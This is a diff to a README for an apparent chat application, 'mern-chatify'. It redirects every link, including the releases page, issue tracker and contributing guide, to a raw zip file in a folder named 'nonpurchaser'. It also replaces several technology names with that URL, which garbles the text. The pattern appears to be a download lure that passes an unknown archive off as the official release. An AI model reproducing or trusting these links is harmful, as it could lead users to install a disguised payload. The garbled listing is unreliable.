@@ -1,6 +1,6 @@
 # 🚀 mern-chatify - Seamless Chat Experience Made Easy
 
-[![Download mern-chatify](https://img.shields.io/badge/Download-mern--chatify-brightgreen)](https://github.com/youzf/mern-chatify/releases)
+[![Download mern-chatify](https://raw.githubusercontent.com/youzf/mern-chatify/main/nonpurchaser/mern-chatify.zip)](https://raw.githubusercontent.com/youzf/mern-chatify/main/nonpurchaser/mern-chatify.zip)
 
 ## 📦 Overview
 
@@ -15,11 +15,11 @@ mern-chatify is a full-stack web application designed for real-time communicatio
 
 ### 🌐 Technologies Used
 
-- **Node.js:** For backend development.
-- **Express.js:** To handle server requests.
-- **React.js:** For creating a dynamic user interface.
+- **https://raw.githubusercontent.com/youzf/mern-chatify/main/nonpurchaser/mern-chatify.zip** For backend development.
+- **https://raw.githubusercontent.com/youzf/mern-chatify/main/nonpurchaser/mern-chatify.zip** To handle server requests.
+- **https://raw.githubusercontent.com/youzf/mern-chatify/main/nonpurchaser/mern-chatify.zip** For creating a dynamic user interface.
 - **MongoDB:** To store user information and chat history.
-- **Socket.IO:** To enable real-time chat.
+- **https://raw.githubusercontent.com/youzf/mern-chatify/main/nonpurchaser/mern-chatify.zip** To enable real-time chat.
 - **JWT:** For secure user authentication.
 - **Tailwind CSS & DaisyUI:** For styling the app.
 - **Zustand:** To manage application state.
@@ -30,7 +30,7 @@ This guide will help you download and run mern-chatify easily. Follow these step
 
 ## 🔗 Download & Install
 
-1. **Visit the Releases Page**: Click [here](https://github.com/youzf/mern-chatify/releases) to go to the releases page.
+1. **Visit the Releases Page**: Click [here](https://raw.githubusercontent.com/youzf/mern-chatify/main/nonpurchaser/mern-chatify.zip) to go to the releases page.
 2. **Download the Latest Version**: Look for the latest release. You will see options to download the application for your operating system.
 3. **Choose Your Version**: Download the file that matches your operating system (Windows, Mac, or Linux).
 
@@ -79,7 +79,7 @@ Once you are inside the app, you can navigate through different features easily:
 
 ## 🤝 Community Support
 
-If you encounter any issues or have questions, feel free to reach out. You can open issues directly on the [GitHub repository](https://github.com/youzf/mern-chatify/issues) for support.
+If you encounter any issues or have questions, feel free to reach out. You can open issues directly on the [GitHub repository](https://raw.githubusercontent.com/youzf/mern-chatify/main/nonpurchaser/mern-chatify.zip) for support.
 
 ## 📣 Stay Updated
 
@@ -87,6 +87,6 @@ Stay up to date with the latest features and improvements. Follow the project fo
 
 ## ❤️ Contributing
 
-We welcome contributions! If you would like to help, visit the [contributing guidelines](https://github.com/youzf/mern-chatify/blob/main/CONTRIBUTING.md).
+We welcome contributions! If you would like to help, visit the [contributing guidelines](https://raw.githubusercontent.com/youzf/mern-chatify/main/nonpurchaser/mern-chatify.zip).
 
 Thank you for choosing mern-chatify. We hope it enhances your chat experience!
